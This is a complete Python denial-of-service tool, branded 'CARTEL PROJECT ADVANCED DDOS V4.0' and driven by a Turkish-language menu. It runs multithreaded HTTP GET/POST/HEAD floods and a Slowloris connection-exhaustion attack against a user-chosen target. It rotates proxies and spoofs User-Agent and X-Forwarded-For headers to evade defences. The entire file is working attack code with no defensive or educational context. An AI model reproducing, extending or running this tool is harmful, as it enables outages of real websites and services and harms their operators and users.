import os
import sys
import time
import threading
import requests
import random
import socket
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from urllib.parse import urlparse

# Disable SSL warnings for speed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
PURPLE = '\033[35m'
CYAN = '\033[36m'
RESET = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Enhanced ASCII Art
ascii_art = f"""{RED}
 ██████╗ █████╗ ██████╗ ████████╗███████╗██╗     
██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║     
██║     ███████║██████╔╝   ██║   █████╗  ██║     
██║     ██╔══██║██╔══██╗   ██║   ██╔══╝  ██║     
╚██████╗██║  ██║██║  ██║   ██║   ███████╗███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝

██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗
██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝
██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║   
██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║   
██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   

            {GREEN}ADVANCED DDOS V4.0 - {RESET}
""" + RESET

# Massive User-Agent Pool
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

# Attack Methods
attack_methods = {
    'GET': 'GET',
    'POST': 'POST',
    'HEAD': 'HEAD',
    'OPTIONS': 'OPTIONS'
}

class AdvancedDDoS:
    def __init__(self):
        self.stats = {'sent': 0, 'errors': 0, 'start_time': time.time()}
        self.proxies = []
        self.target = None
        self.parsed_target = None
        self.attack_running = False
        
    def load_proxies(self):
        """Load proxies from file with validation"""
        self.proxies = []
        lines = []
        for filename in ['proxies.txt', 'proxy.txt', 'socks.txt']:
            lines.extend(self.read_file_safely(filename))
        
        for line in lines:
            proxy = line.strip()
            if proxy and (':' in proxy or proxy.startswith('socks')):
                self.proxies.append(proxy)
        
        print(f"{GREEN}✅ {len(self.proxies)} proxy yüklendi{RESET}")
    
    def read_file_safely(self, filename):
        """Safe file reading"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.readlines()
            return []
        except:
            return []
    
    def validate_target(self, target):
        """Enhanced target validation"""
        if not target:
            return False
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            parsed = urlparse(target)
            if not parsed.netloc:
                return False
            socket.gethostbyname(parsed.netloc)
            return target
        except:
            return False
    
    def get_random_headers(self, method='GET'):
        """Generate random headers for evasion"""
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if method == 'POST':
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '42'
            })
            
        # Randomize additional headers
        extra_headers = [
            ('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
            ('X-Real-IP', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
            ('X-Originating-IP', f"[::1]"),
            ('X-Remote-IP', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
            ('X-Remote-Addr', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        ]
        
        for header, value in random.sample(extra_headers, random.randint(2,4)):
            headers[header] = value
            
        return headers
    
    def get_proxy(self):
        """Get random working proxy"""
        if not self.proxies:
            return None
        return {
            'http': f"http://{random.choice(self.proxies)}",
            'https': f"http://{random.choice(self.proxies)}"
        }
    
    def slowloris_attack(self):
        """Slowloris attack - keeps connections open"""
        sockets = []
        try:
            for _ in range(500):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.parsed_target.netloc.split(':')[0], 80 if not self.parsed_target.port else self.parsed_target.port))
                    s.send(f"GET /{random.randint(1,999999)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {self.parsed_target.netloc}\r\n".encode())
                    
                    for i in range(1):
                        s.send(f"X-Padding-{random.randint(1,5000)}: {random._urandom(2000).hex()}\r\n".encode())
                    
                    s.send(b"\r\n")
                    sockets.append(s)
                except:
                    continue
            
            while self.attack_running:
                sockets = [s for s in sockets if s.fileno() != -1]
                if not sockets:
                    break
                for s in sockets.copy():
                    try:
                        s.send(f"{random._urandom(2).hex()}\r\n".encode())
                    except:
                        sockets.remove(s)
                time.sleep(0.1)
                        
        except KeyboardInterrupt:
            pass
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def http_flood(self, method='GET', threads=1):
        """Multi-method HTTP flood"""
        def attack_worker():
            session = requests.Session()
            session.verify = False
            
            while self.attack_running:
                try:
                    headers = self.get_random_headers(method)
                    proxy_dict = self.get_proxy() if random.choice([True, False]) else None
                    
                    data = None
                    if method == 'POST':
                        data = {
                            'username': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
                            'password': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
                            'csrf_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                        }
                    
                    response = session.request(
                        method, self.target, 
                        headers=headers, proxies=proxy_dict,
                        data=data, timeout=(2, 5), allow_redirects=False
                    )
                    
                    self.stats['sent'] += 1
                    if response.status_code >= 400:
                        self.stats['errors'] += 1
                        
                except:
                    self.stats['sent'] += 1
                    self.stats['errors'] += 1
            
            session.close()
        
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, daemon=True)
            t.start()
            workers.append(t)
        
        return workers
    
    def status_printer(self):
        """Real-time statistics"""
        while self.attack_running:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                rps = self.stats['sent'] / elapsed
                error_rate = (self.stats['errors'] / self.stats['sent'] * 100) if self.stats['sent'] > 0 else 0
                
                clear()
                print(ascii_art)
                print(f"{CYAN}{'═'*70}{RESET}")
                print(f"{GREEN}🎯 TARGET: {self.target}{RESET}")
                print(f"{YELLOW}📊 PAKET: {self.stats['sent']:>8,} | RPS: {rps:>8.1f} | HATA: {self.stats['errors']:>6,} ({error_rate:>5.1f}%){RESET}")
                print(f"{PURPLE}⏱️ SÜRE: {elapsed:>8.1f}s | PROXY: {len(self.proxies):>4}{RESET}")
                print(f"{CYAN}{'═'*70}{RESET}")
                print("Ctrl+C ile durdur")
                time.sleep(0.5)
    
    def launch_attack(self, target, threads=500, method='GET', proxy_mode=False):
        """Main attack launcher"""
        print(f"{YELLOW}[+] Target validation...{RESET}")
        validated_target = self.validate_target(target)
        if not validated_target:
            print(f"{RED}❌ Geçersiz hedef!{RESET}")
            return
        
        self.target = validated_target
        self.parsed_target = urlparse(validated_target)
        self.attack_running = True
        
        if proxy_mode:
            self.load_proxies()
        
        print(f"{GREEN}✅ Saldırı başlatılıyor... ({method} x{threads} threads){RESET}")
        
        # Start status printer
        status_thread = threading.Thread(target=self.status_printer, daemon=True)
        status_thread.start()
        
        # Launch different attack vectors
        workers = self.http_flood(method, min(threads, 1000))
        
        # Add slowloris in background (50% chance)
        if random.choice([True, False]):
            slowloris_thread = threading.Thread(target=self.slowloris_attack, daemon=True)
            slowloris_thread.start()
        
        try:
            # Wait for attack
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.attack_running = False
            elapsed = time.time() - self.stats['start_time']
            rps = self.stats['sent'] / elapsed if elapsed > 0 else 0
            
            clear()
            print(ascii_art)
            print(f"{GREEN}{'═'*70}{RESET}")
            print(f"✅ Saldırı BİTTİ!")
            print(f"📊 TOPLAM: {self.stats['sent']:>8,} paket | {rps:>8.1f} RPS")
            print(f"❌ HATALAR: {self.stats['errors']:>8,}")
            print(f"⏱️ SÜRE: {elapsed:>8.1f} saniye")
            print(f"{GREEN}{'═'*70}{RESET}{RESET}")

def main_menu():
    ddos = AdvancedDDoS()
    
    while True:
        try:
            clear()
            print(ascii_art)
            print(f"\n{RED}{'═'*60}{RESET}")
            print(f"{GREEN}1. 🌩️  HTTP FLOOD (GET/POST/HEAD){RESET}")
            print(f"{YELLOW}2. 🐌  SLOWLORIS{RESET}")
            print(f"{PURPLE}3. ⚡  FULL ATTACK (Multi-Vector){RESET}")
            print(f"{CYAN}4. 📡  PROXY TEST{RESET}")
            print(f"{RED}0. 🚪  ÇIKIŞ{RESET}")
            print(f"{'═'*60}{RESET}")
            
            choice = input("Seçim: ").strip()
            
            if choice == "0":
                print(f"{YELLOW}Güle güle!{RESET}")
                break
            
            if choice in ["1", "2", "3"]:
                target = input("🎯 Hedef (IP/URL): ").strip()
                if not target:
                    print(f"{RED}❌ Hedef gerekli!{RESET}")
                    time.sleep(1)
                    continue
                
                proxy_mode = input("📡 Proxy kullan? (e/h): ").strip().lower() == 'e'
                
                while True:
                    try:
                        if choice == "2":  # Slowloris
                            threads = 200
                        else:
                            threads = int(input("🔥 Thread sayısı (100-2000): "))
                            if 100 <= threads <= 2000:
                                break
                        print(f"{RED}❌ 100-2000 arası girin!{RESET}")
                    except:
                        print(f"{RED}❌ Sayı girin!{RESET}")
                
                method = 'GET'
                if choice == "1":
                    print("Method: 1=GET 2=POST 3=HEAD")
                    mchoice = input("Method: ").strip()
                    method = {'1': 'GET', '2': 'POST', '3': 'HEAD'}.get(mchoice, 'GET')
                
                confirm = input(f"\n🎯 {target} | 🔥 {threads} thread | 📡 {'ON' if proxy_mode else 'OFF'} | {method}\nDEVAM? (e/h): ").strip().lower()
                
                if confirm == 'e':
                    if choice == "3":
                        ddos.launch_attack(target, threads, 'GET', proxy_mode)
                    elif choice == "2":
                        ddos.launch_attack(target, threads, 'GET', proxy_mode)  # Slowloris uses GET
                    else:
                        ddos.launch_attack(target, threads, method, proxy_mode)
                else:
                    print(f"{YELLOW}İptal edildi.{RESET}")
            
            elif choice == "4":
                ddos.load_proxies()
                input("\nProxylar yüklendi! Enter...")
            
            else:
                print(f"{RED}❌ Geçersiz!{RESET}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{RED}Çıkış!{RESET}")
            break

if __name__ == "__main__":
    main_menu()